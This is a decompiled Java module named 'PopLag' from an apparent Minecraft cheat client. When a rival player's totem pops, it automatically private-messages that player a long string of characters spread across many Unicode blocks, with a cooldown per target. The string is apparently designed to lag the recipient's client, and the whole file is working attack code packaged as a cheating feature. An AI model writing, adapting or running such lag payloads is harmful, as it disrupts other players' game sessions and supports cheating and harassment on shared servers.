package bodevelopment.client.blackout.module.modules.combat.misc;

import bodevelopment.client.blackout.BlackOut;
import bodevelopment.client.blackout.event.Event;
import bodevelopment.client.blackout.event.events.PopEvent;
import bodevelopment.client.blackout.manager.Managers;
import bodevelopment.client.blackout.module.Module;
import bodevelopment.client.blackout.module.SubCategory;
import bodevelopment.client.blackout.module.modules.combat.offensive.AutoCrystal;
import bodevelopment.client.blackout.module.setting.Setting;
import bodevelopment.client.blackout.module.setting.SettingGroup;
import bodevelopment.client.blackout.randomstuff.timers.TimerList;
import java.util.UUID;
import net.minecraft.class_634;

public class PopLag extends Module {
   private final SettingGroup sgGeneral = this.addGroup("General");
   private final Setting<Boolean> target;
   private final Setting<String> command;
   private final Setting<Integer> length;
   private final Setting<Double> cooldown;
   private final TimerList<UUID> sent;

   public PopLag() {
      super("Pop Lag", ".", SubCategory.MISC_COMBAT, true);
      this.target = this.sgGeneral.b("Target", true, ".");
      this.command = this.sgGeneral.s("Command", "msg", ".");
      this.length = this.sgGeneral.i("Length", 200, 0, 224, 1, ".");
      this.cooldown = this.sgGeneral.d("Cooldown (Minutes)", 2.0D, 0.0D, 10.0D, 0.1D, ".");
      this.sent = new TimerList(true);
   }

   @Event
   public void onPop(PopEvent event) {
      if (event.player != BlackOut.mc.field_1724 && !Managers.FRIENDS.isFriend(event.player)) {
         UUID uuid = event.player.method_5667();
         if (!this.sent.contains((Object)uuid)) {
            if ((Boolean)this.target.get() && AutoCrystal.getInstance().targetedPlayer != event.player) {
               return;
            }

            class_634 var10000 = BlackOut.mc.method_1562();
            String var10001 = (String)this.command.get();
            var10000.method_45730(var10001 + " " + event.player.method_5477().getString() + " " + this.buildString());
            this.sent.add(uuid, (Double)this.cooldown.get() * 60.0D);
         }

      }
   }

   private String buildString() {
      StringBuilder builder = new StringBuilder();
      int offset = 0;

      for(int left = (Integer)this.length.get(); left > 0; ++offset) {
         for(int i = 0; i < Math.min(left, 222); ++i) {
            builder.append((char)((i + 2) * 256 + offset));
            --left;
         }
      }

      return builder.toString();
   }
}
